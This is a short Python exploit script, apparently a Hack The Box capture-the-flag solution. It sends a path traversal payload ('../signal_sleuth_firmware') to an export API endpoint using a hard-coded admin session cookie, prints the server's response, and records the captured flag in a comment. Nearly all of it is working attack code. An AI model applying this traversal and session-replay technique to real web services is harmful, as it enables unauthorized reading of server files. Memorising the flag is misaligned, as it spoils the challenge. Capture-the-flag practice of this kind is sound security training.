import requests

ip = '142.93.35.133:31762'
url = f'http://{ip}/api/export'

cookies = {
    'session': 'eyJhdXRoIjoiZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SjFjMlZ5Ym1GdFpTSTZJbUZrYldsdUlpd2laWGh3SWpveE5qYzVORGcxTVRVemZRLjJySTBNd1M5QWtvM1FJNUd6Q0QzX3N4VHJxRmprdE5HcFJwbEpVVzVFRTgifQ.ZBqUgQ.URRYhw2WS5dIAmA6VEmo0ITlB5s',
}

headers = {
    'Accept': '*/*',
    'Accept-Language': 'en,en-US;q=0.9,id;q=0.8',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json;charset=UTF-8',
    # 'Cookie': 'session=eyJhdXRoIjoiZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SjFjMlZ5Ym1GdFpTSTZJbUZrYldsdUlpd2laWGh3SWpveE5qYzVORGcwTURnNWZRLndmQXhLckpwNUpMUDRTOGN2dmZBOUduYk5TS0ZpektfVm9yaTFDaENvRjAifQ.ZBqQWQ.uYjNh8W7P3mwBPCqA16QgxTsof8',
    'Origin': 'http://161.35.168.118:32506',
    'Referer': 'http://161.35.168.118:32506/home',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
}

json_data = {
    'name': '../signal_sleuth_firmware',
}

response = requests.post(url, cookies=cookies, headers=headers, json=json_data, verify=False)

print(response.text)
# HTB{T1m3_b4$3d_$ql1_4r3_fun!!!}
# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"name":"communication.mp3"}'
#response = requests.post('http://161.35.168.118:32506/api/export', cookies=cookies, headers=headers, data=data, verify=False